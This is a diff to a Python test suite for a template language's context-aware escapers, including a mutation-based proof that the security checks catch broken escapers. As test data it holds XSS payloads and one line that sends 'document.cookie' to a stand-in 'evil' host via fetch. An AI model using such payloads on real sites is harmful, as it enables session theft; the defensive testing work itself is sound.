@@ -154,6 +154,84 @@ def _err(result):
     return result.value
 
 
+# ---- the security checks, shared by the tests and the neutering proof --------
+#
+# Each function below is the BODY of one security test, factored out so that the
+# neutering proof at the end of this file re-derives the SAME assertions against
+# a deliberately broken module rather than a hand-copied parallel of them. A
+# check raises AssertionError when the property it names does not hold, so
+# "the shipped module passes every check" and "a neutered module fails at least
+# one" are both measurable statements about one definition.
+
+def _assert_script_element_breakout_closed(ns):
+    # the raw bytes an HTML parser scans for the end of the element must not
+    # appear; the JS value is byte-identical once the runtime unescapes it.
+    out = _ok(ns["tpl_render_one"]("<script>x(\"{{script:v}}\")</script>", "v",
+                                   SCRIPT_PAYLOAD))
+    assert out == ('<script>x("\\u003C/script\\u003E\\u003Cimg src=x '
+                   'onerror=alert(1)\\u003E\\u003C!--")</script>')
+    inner = out[len('<script>x("'):-len('")</script>')]
+    for raw in ("<", ">", "&", "'"):
+        assert raw not in inner, (raw, inner)
+
+
+def _assert_html_attribute_breakout_closed(ns):
+    out = _ok(ns["tpl_render_one"]('<a title="{{html:t}}">x</a>', "t",
+                                   '"><script>alert(1)</script>'))
+    assert out == ('<a title="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">'
+                   'x</a>')
+    attr = out[len('<a title="'):-len('">x</a>')]
+    assert '"' not in attr and "<" not in attr and ">" not in attr
+
+
+def _assert_uri_component_breakout_closed(ns):
+    out = _ok(ns["tpl_render_one"]('/n/{{uri:s}}', "s", "a/../../etc?x=1#f"))
+    assert out == "/n/a%2F..%2F..%2Fetc%3Fx%3D1%23f"
+
+
+def _assert_a_different_rule_per_context(ns):
+    # the whole point: one value, three contexts, three different outputs. If
+    # any two agreed here the "chosen by the insertion context" claim would be
+    # untested for that pair.
+    payload = "</script> ' a&b "
+    got = {c: _ok(ns["tpl_escape_for"](c, payload)) for c in ("html", "script", "uri")}
+    assert len(set(got.values())) == 3, got
+    assert got["html"] != got["script"] and got["script"] != got["uri"]
+    assert got["html"] != got["uri"]
+
+
+def _assert_escape_for_refuses_an_unknown_context(ns):
+    # no silent fall-through to a default escaper: an unknown or misspelled
+    # context is an Err. This is the case that would otherwise be a silent
+    # downgrade from the intended escaper.
+    for bad in ("", "Script", "HTML", "javscript", "htm", " raw"):
+        e = _err(ns["tpl_escape_for"](bad, "</script>"))
+        assert e["code"] == "unknown-context", (bad, e)
+        assert bad in e["message"]
+        assert "html, script, uri" in e["message"]
+
+
+def _assert_scan_refuses_an_unknown_context(ns):
+    for tpl, ctx in (("{{Script:x}}", "Script"), ("{{htmlx:x}}", "htmlx"),
+                     ("{{:x}}", "")):
+        e = _err(ns["tpl_holes"](tpl))
+        assert e["code"] == "unknown-context", (tpl, e)
+        assert ctx in e["message"]
+
+
+#: (label, check). The neutering proof at the end of this file runs every check
+#: against a broken module and requires at least one of them to fail.
+SECURITY_CHECKS = (
+    ("script element breakout is closed", _assert_script_element_breakout_closed),
+    ("html quoted-attribute breakout is closed", _assert_html_attribute_breakout_closed),
+    ("uri component breakout is closed", _assert_uri_component_breakout_closed),
+    ("a different rule per context", _assert_a_different_rule_per_context),
+    ("escape_for refuses an unknown context",
+     _assert_escape_for_refuses_an_unknown_context),
+    ("scan refuses an unknown context", _assert_scan_refuses_an_unknown_context),
+)
+
+
 # ---- the context set ---------------------------------------------------------
 
 def test_contexts_is_the_closed_set(ns):
@@ -185,25 +263,11 @@ def test_escape_for_uri_percent_encodes_a_component(ns):
 
 
 def test_escape_for_picks_a_different_rule_per_context(ns):
-    # the whole point: one value, three contexts, three different outputs. If
-    # any two agreed here the "chosen by the insertion context" claim would be
-    # untested for that pair.
-    payload = "</script> ' a&b "
-    got = {c: _ok(ns["tpl_escape_for"](c, payload)) for c in ("html", "script", "uri")}
-    assert len(set(got.values())) == 3, got
-    assert got["html"] != got["script"] and got["script"] != got["uri"]
-    assert got["html"] != got["uri"]
+    _assert_a_different_rule_per_context(ns)
 
 
 def test_escape_for_refuses_an_unknown_context(ns):
-    # no silent fall-through to a default escaper: an unknown or misspelled
-    # context is an Err. This is the case that would otherwise be a silent
-    # downgrade from the intended escaper.
-    for bad in ("", "Script", "HTML", "javscript", "htm", " raw"):
-        e = _err(ns["tpl_escape_for"](bad, "</script>"))
-        assert e["code"] == "unknown-context", (bad, e)
-        assert bad in e["message"]
-        assert "html, script, uri" in e["message"]
+    _assert_escape_for_refuses_an_unknown_context(ns)
 
 
 # ---- scan --------------------------------------------------------------------
@@ -217,6 +281,28 @@ def test_scan_returns_holes_left_to_right_with_offsets(ns):
     # the offsets address the template exactly
     assert tpl[hs[0]["start"]:hs[0]["end"]] == "{{uri:u}}"
     assert tpl[hs[1]["start"]:hs[1]["end"]] == "{{html:t}}"
+
+
+def test_scan_offsets_are_codepoints_not_bytes(ns):
+    # The offset unit is the one `length`/`slice`/`charCodeAt` use, which is
+    # CODEPOINTS on every tier, not UTF-8 bytes. Nothing above re-derives that,
+    # because a pure-ASCII template makes the two units agree. Here they do not:
+    # if the module ever switched to byte offsets (or a reader assumed bytes and
+    # wrote `tpl.encode()[start:end]`), the codepoint slice would stop matching
+    # while every ASCII test above kept passing.
+    for tpl, hole, cps, nbytes in (
+        ("\u00e9{{html:x}}", "{{html:x}}", 11, 12),
+        ("\u65e5\u672c\u8a9e{{uri:u}}", "{{uri:u}}", 12, 18),
+    ):
+        assert len(tpl) == cps and len(tpl.encode("utf-8")) == nbytes
+        h = _ok(ns["tpl_holes"](tpl))[0]
+        start, end = h["start"], h["end"]
+        # the hole is where the offset says it is, in the template's own unit
+        assert (start, end) == (cps - len(hole), cps)
+        assert tpl[start:end] == hole
+        # ... and a BYTE slice of the same indices is NOT the hole, so the test
+        # is falsifiable rather than merely passing under either unit.
+        assert tpl.encode("utf-8")[start:end] != hole.encode("utf-8")
 
 
 def test_scan_accepts_a_template_with_no_holes(ns):
@@ -239,11 +325,7 @@ def test_scan_refuses_a_hole_with_no_context(ns):
 
 
 def test_scan_refuses_an_unknown_context(ns):
-    for tpl, ctx in (("{{Script:x}}", "Script"), ("{{htmlx:x}}", "htmlx"),
-                     ("{{:x}}", "")):
-        e = _err(ns["tpl_holes"](tpl))
-        assert e["code"] == "unknown-context", (tpl, e)
-        assert ctx in e["message"]
+    _assert_scan_refuses_an_unknown_context(ns)
 
 
 def test_scan_refuses_a_non_identifier_name(ns):
@@ -331,29 +413,15 @@ SCRIPT_PAYLOAD = '</script><img src=x onerror=alert(1)><!--'
 
 
 def test_script_context_payload_cannot_break_the_element(ns):
-    # the raw bytes an HTML parser scans for the end of the element must not
-    # appear; the JS value is byte-identical once the runtime unescapes it.
-    out = _ok(ns["tpl_render_one"]("<script>x(\"{{script:v}}\")</script>", "v",
-                                 SCRIPT_PAYLOAD))
-    assert out == ('<script>x("\\u003C/script\\u003E\\u003Cimg src=x '
-                   'onerror=alert(1)\\u003E\\u003C!--")</script>')
-    inner = out[len('<script>x("'):-len('")</script>')]
-    for raw in ("<", ">", "&", "'"):
-        assert raw not in inner, (raw, inner)
+    _assert_script_element_breakout_closed(ns)
 
 
 def test_html_context_payload_cannot_break_a_quoted_attribute(ns):
-    out = _ok(ns["tpl_render_one"]('<a title="{{html:t}}">x</a>', "t",
-                                  '"><script>alert(1)</script>'))
-    assert out == ('<a title="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">'
-                   'x</a>')
-    attr = out[len('<a title="'):-len('">x</a>')]
-    assert '"' not in attr and "<" not in attr and ">" not in attr
+    _assert_html_attribute_breakout_closed(ns)
 
 
 def test_uri_context_payload_cannot_inject_a_component(ns):
-    out = _ok(ns["tpl_render_one"]('/n/{{uri:s}}', "s", "a/../../etc?x=1#f"))
-    assert out == "/n/a%2F..%2F..%2Fetc%3Fx%3D1%23f"
+    _assert_uri_component_breakout_closed(ns)
 
 
 def test_the_context_choice_is_load_bearing(ns):
@@ -396,3 +464,175 @@ def test_no_raw_insertion_form_is_expressible(ns):
         result = ns["tpl_render"](tpl, [ns["bind"]("x", SCRIPT_PAYLOAD)])
         assert type(result).__name__ == "Err", (tpl, result)
         assert result.value["code"] in ("malformed-hole", "unknown-context"), (tpl, result)
+
+
+def test_a_single_quoted_js_literal_site_is_the_same_author_error(ns):
+    # The other instance of the documented wrong-declaration limit, and the
+    # reason the context table scopes `script` to a DOUBLE-quoted literal:
+    # escape_js leaves the single quote alone ON PURPOSE, so declaring `script`
+    # correctly (per the table) at a single-quoted JS literal still closes that
+    # literal and runs the payload. Pinned so the scoping cannot be quietly
+    # widened back to "any JS string literal".
+    v = "';fetch('//evil/'+document.cookie)//"
+    out = _ok(ns["tpl_render_one"]("<script>const cfg = '{{script:v}}';</script>",
+                                   "v", v))
+    assert out == ("<script>const cfg = '';fetch('//evil/'+document.cookie)"
+                   "//';</script>")
+    # the injected quote survived verbatim -- that is what makes it live JS
+    assert "'" in out and "\\" not in out
+    # the same value in the DOUBLE-quoted literal the context is scoped to is
+    # inert: the raw quotes are still there, but they close nothing.
+    safe = _ok(ns["tpl_render_one"]('<script>const cfg = "{{script:v}}";</script>',
+                                    "v", v))
+    assert safe == ('<script>const cfg = "\';fetch(\'//evil/\'+document.cookie)'
+                    '//";</script>')
+    assert "\\" not in safe
+
+
+# ---- the neutering proof -----------------------------------------------------
+#
+# docs/design/459-frontend-asset-integration.md claims this file carries a
+# neutering proof: that the security assertions above are stronger than "the
+# shipped output happens to look right", because a module whose escaper table
+# returns its argument unchanged emits the payload verbatim and the SAME
+# assertions catch it. That claim is only worth anything if something committed
+# re-derives it, so the harness lives here.
+#
+# Each mutation is a source rewrite of `stdlib/template.rvl` or
+# `stdlib/escape.rvl`, applied to a COPY in `tmp_path`. The `consumer_ir`
+# fixture reads and compiles the `.rvl` files at test time and the harness does
+# the same, so a mutation reaches the layer the checks actually execute; the
+# working tree is never touched. A mutation that NO check catches is a hole in
+# this suite, and the test below fails on it.
+
+def _sub(old, new):
+    """A mutation that replaces `old` (which must appear exactly once)."""
+    def apply(src):
+        assert src.count(old) == 1, (old, src.count(old))
+        return src.replace(old, new)
+    return apply
+
+
+def _body(name, body):
+    """A mutation that replaces the whole body of the top-level `fn name`.
+
+    Splits on the newline character (never `str.splitlines()`): escape.rvl's
+    `escape_js` doc comment quotes U+2028/U+2029, which `splitlines()` treats as
+    line boundaries and the rejoin would turn into real newlines -- moving those
+    characters OUT of the comment and breaking the file so it no longer lexes. A
+    mutation that cannot even parse is not a mutation of the escaper.
+    """
+    def apply(src):
+        lines = src.split("\n")
+        start = next(i for i, line in enumerate(lines)
+                     if line.startswith(f"pub fn {name}(") or line.startswith(f"fn {name}("))
+        end = lines.index("}", start)
+        return "\n".join(lines[:start + 1] + [f"  {line}" for line in body.split("\n")]
+                         + lines[end:])
+    return apply
+
+
+def _escape_known_returns(expr):
+    return _body("escape_known", f"return {expr}")
+
+
+_ESCAPE_FOR_GATE = '  if (!context_ok(context)) { return Err(bad_context(context, 0)) }\n'
+_SCAN_GATE = '      if (!context_ok(context)) { return Err(bad_context(context, i)) }\n'
+
+#: mutation name -> [(file, mutator)]. `file` is "template" or "escape".
+MUTATIONS = {
+    "N1 escape_known returns its argument": [
+        ("template", _escape_known_returns("value"))],
+    "N2 escape_known always escapes html": [
+        ("template", _escape_known_returns("escape_html(value)"))],
+    "N3 escape_known always escapes js": [
+        ("template", _escape_known_returns("escape_js(value)"))],
+    "N5 escape_for's context_ok gate removed": [
+        ("template", _sub(_ESCAPE_FOR_GATE, ""))],
+    "N6 scan's context_ok gate removed": [
+        ("template", _sub(_SCAN_GATE, ""))],
+    "N7 all three escapers -> identity": [
+        ("escape", _body("escape_html", "return s")),
+        ("escape", _body("escape_js", "return s")),
+        ("escape", _body("escape_uri", "return s"))],
+    "N7a escape_html -> identity": [("escape", _body("escape_html", "return s"))],
+    "N7b escape_js -> identity": [("escape", _body("escape_js", "return s"))],
+    "N7c escape_uri -> identity": [("escape", _body("escape_uri", "return s"))],
+    "N8 script holes use escape_html": [
+        ("template", _sub('if (context == "script") { return escape_js(value) }',
+                          'if (context == "script") { return escape_html(value) }'))],
+    "N9 uri holes use escape_html": [
+        ("template", _sub('if (context == "uri") { return escape_uri(value) }',
+                          'if (context == "uri") { return escape_html(value) }'))],
+    "N10 html holes use escape_uri": [
+        ("template", _sub("  return escape_html(value)\n}",
+                          "  return escape_uri(value)\n}"))],
+    "N11 html holes use escape_js": [
+        ("template", _sub("  return escape_html(value)\n}",
+                          "  return escape_js(value)\n}"))],
+    "N12 script holes use escape_uri": [
+        ("template", _sub('if (context == "script") { return escape_js(value) }',
+                          'if (context == "script") { return escape_uri(value) }'))],
+    "N13 uri holes use escape_js": [
+        ("template", _sub('if (context == "uri") { return escape_uri(value) }',
+                          'if (context == "uri") { return escape_js(value) }'))],
+    "N14 both context_ok gates removed": [
+        ("template", _sub(_ESCAPE_FOR_GATE, "")),
+        ("template", _sub(_SCAN_GATE, ""))],
+}
+
+
+def _broken_ns(tmp_path, mutations):
+    """Compile the module from `mutations`-rewritten sources; exec the py tier."""
+    sources = {
+        "template": MODULE.read_text(encoding="utf-8"),
+        "escape": ESCAPE.read_text(encoding="utf-8"),
+    }
+    for key, mutate in mutations:
+        sources[key] = mutate(sources[key])
+    # Mirror the repo's layout so BOTH hops of the import chain resolve inside
+    # the copy. `use` resolves against the IMPORTING file's directory first and
+    # only then against the search path (which ends at the real revl stdlib), so
+    # the consumer at <tmp>/main.rvl reaches <tmp>/stdlib/template.rvl, and
+    # template.rvl (whose own directory is <tmp>/stdlib) reaches
+    # <tmp>/stdlib/stdlib/escape.rvl. Without that second copy the template's
+    # import falls through to the SHIPPED escape.rvl and an escape.rvl mutation
+    # would silently not take effect -- which the assertion below would then
+    # report as "not caught", so this layout is load-bearing for the proof.
+    outer = tmp_path / "stdlib"
+    outer.mkdir()
+    (outer / "template.rvl").write_text(sources["template"], encoding="utf-8")
+    (outer / "escape.rvl").write_text(sources["escape"], encoding="utf-8")
+    nested = outer / "stdlib"
+    nested.mkdir()
+    (nested / "escape.rvl").write_text(sources["escape"], encoding="utf-8")
+    main = tmp_path / "main.rvl"
+    main.write_text(CONSUMER, encoding="utf-8")
+    return _exec_python(compile_files([str(main)]))
+
+
+def _failed_checks(ns):
+    failed = []
+    for label, check in SECURITY_CHECKS:
+        try:
+            check(ns)
+        except AssertionError:
+            failed.append(label)
+    return failed
+
+
+def test_the_proof_has_a_baseline_the_shipped_module_passes_every_check(ns):
+    # half one of the proof: with NO mutation, every security check holds. A
+    # mutation is only meaningful evidence against a green baseline.
+    assert _failed_checks(ns) == []
+
+
+@pytest.mark.parametrize("name", sorted(MUTATIONS))
+def test_every_neutering_is_caught_by_the_committed_checks(tmp_path, name):
+    # half two: break the module and require the committed checks to notice.
+    ns = _broken_ns(tmp_path, MUTATIONS[name])
+    failed = _failed_checks(ns)
+    assert failed, (
+        f"{name!r} was NOT caught: the module was broken and all "
+        f"{len(SECURITY_CHECKS)} security checks still passed, so the suite "
+        f"does not pin the property the mutation removes")
